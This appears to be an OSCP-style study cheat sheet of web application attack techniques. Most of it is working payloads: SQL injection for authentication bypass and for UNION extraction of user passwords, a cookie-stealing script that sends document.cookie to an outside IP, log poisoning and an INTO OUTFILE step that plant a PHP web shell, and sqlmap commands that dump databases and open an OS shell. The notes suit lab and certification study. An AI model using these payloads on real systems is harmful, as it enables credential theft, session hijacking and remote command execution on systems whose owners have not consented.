# OSCP - Web Applications
## General
Try reading the php source code of the web application:
```
http://<ip>/script.php/?-s
```
Do you see any LFI/RFI vulnerability posted by Nikto? Try
```
fimap -u <ip-address>
```
Check for Input Validation in forms:
```
1′ or 1=1 limit 1;#   AND   1′ or 1=1--)
```
Stealing Cookies
```
<iframe src="http://10.11.0.5/report" height = "0" width = "0"></iframe>

<script>
new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;
</script>
```
## File Inclusion Vulnerabilities

php.ini values:
```
register_globals
allow_url
allow_url_fopen
allow_url_include
```
terminate our request with a null byte () (possible in php below 5.3)

For LFI/RFI attacks, this might be useful:
```
https://github.com/lightos/Panoptic/
```

### Contaminating Log Files
contaminate log file to cause them to contain PHP code to be later used in LFI attack
```
nv -nv 192.168.30.35 80
<?php echo shell_exec($_GET['cmd']);?>
```
thus, cmd= is introduced into the php execution and now by including the logfile you can execute any command


## SQL Injection
Classic Authentication Bypass
```
select * from users where name ='any' or 1=1;#'

select * from users where name ='any' or 1=1 limit 1;#'
```
### Error Based Enum
order by
```
union all operator → allows us to add our own select queries to the original but the new select needs to have the same number of columns as the original columns statement
```

```
union all select 1,2,3,4,5,6
union all select 1,2,3,4,@@version,6
union all select 1,2,3,4,user(),6

union all select 1,2,3,4,table_name,6 FROM information_schema.tables

union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

union select 1,2,name,4,password,6 FROM users
```

OR

```
http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
```

### Blind SQL Injection
```
and 1=1;#
and 1=2;#
```
if they have different results then it is an indication of possible injection spot
use time as a test parameter for query
```
sleep(5)

select IF(MID(@@version,1,1) = '5', SLEEP(5), 0);

union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6

http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

### SQLMap
```
sqlmap -u http://192.168.30.35 --crawl=1

sqlmap -u http://192.168.30.35/comment.php?id=738 --dbms=mysql --dump --threads=5

sqlmap -u http://192.168.30.35/comment.php?id=738 --dbms=mysql --os-shell
```

### Modify HTTP Headers

Install addon “Modify Headers”
In some cases, to look like you have a different IP, you can change the value of the X-Forwarded-For
https://docs.alertlogic.com/userGuides/web-security-manager-premier-preserve-IP-address.htm
